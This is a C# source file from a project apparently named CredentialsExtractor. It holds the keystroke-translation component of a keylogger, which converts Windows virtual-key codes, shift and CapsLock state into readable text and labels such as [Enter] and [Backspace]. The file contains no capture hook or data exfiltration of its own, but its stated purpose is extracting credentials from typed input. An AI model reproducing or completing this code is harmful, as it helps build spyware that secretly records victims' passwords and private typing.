// KeyboardUtils.cs
using CredentialsExtractor.Native;

namespace CredentialsExtractor.Input
{
    public class KeyboardUtils : IKeyboardUtils
    {
        private static readonly Dictionary<int, string> _shiftChars = new Dictionary<int, string>
        {
            {48, ")"}, {49, "!"}, {50, "@"}, {51, "#"}, {52, "$"}, {53, "%"}, {54, "^"}, {55, "&"}, {56, "*"}, {57, "("},
            {186, ":"}, {187, "+"}, {188, "<"}, {189, "_"}, {190, ">"}, {191, "?"}, {192, "~"}, {219, "{"}, {220, "|"}, {221, "}"}, {222, "\""}
        };

        public bool IsCapsLockOn()
        {
            return (((ushort)NativeMethods.GetKeyState(0x14)) & 0xffff) != 0;
        }

        public string GetKeyChar(int vkCode, bool shiftActive, bool capsLockOn)
        {
            switch (vkCode)
            {
                case 8: return "[Backspace]";
                case 9: return "[Tab]";
                case 13: return "[Enter]\r\n";
                case 27: return "[Esc]";
                case 32: return " ";
                case 37: return "[Left]";
                case 38: return "[Up]";
                case 39: return "[Right]";
                case 40: return "[Down]";
                case 46: return "[Delete]";
                case 16: return "[Shift]";
                case 160: return "[LShift]";
                case 161: return "[RShift]";
                case 17: case 162: case 163: return "[Ctrl]";
                case 18: case 164: case 165: return "[Alt]";
                case 20: return $"[CapsLock:{(capsLockOn ? "ON" : "OFF")}]";
                case 91: return "[Win]";
            }

            if (vkCode >= 65 && vkCode <= 90)
            {
                bool useUppercase = (capsLockOn && !shiftActive) || (!capsLockOn && shiftActive);
                return useUppercase ? ((char)vkCode).ToString() : ((char)(vkCode + 32)).ToString();
            }

            if ((vkCode >= 48 && vkCode <= 57) || _shiftChars.ContainsKey(vkCode))
            {
                if (shiftActive && _shiftChars.ContainsKey(vkCode))
                    return _shiftChars[vkCode];
                else if (vkCode >= 48 && vkCode <= 57)
                    return ((char)vkCode).ToString();
                else
                {
                    switch (vkCode)
                    {
                        case 186: return ";";
                        case 187: return "=";
                        case 188: return ",";
                        case 189: return "-";
                        case 190: return ".";
                        case 191: return "/";
                        case 192: return "`";
                        case 219: return "[";
                        case 220: return "\\";
                        case 221: return "]";
                        case 222: return "'";
                    }
                }
            }

            if (vkCode >= 96 && vkCode <= 105)
                return (vkCode - 96).ToString();

            if (vkCode >= 112 && vkCode <= 123)
                return $"[F{vkCode - 111}]";

            return $"[Key:{vkCode}]";
        }
    }
}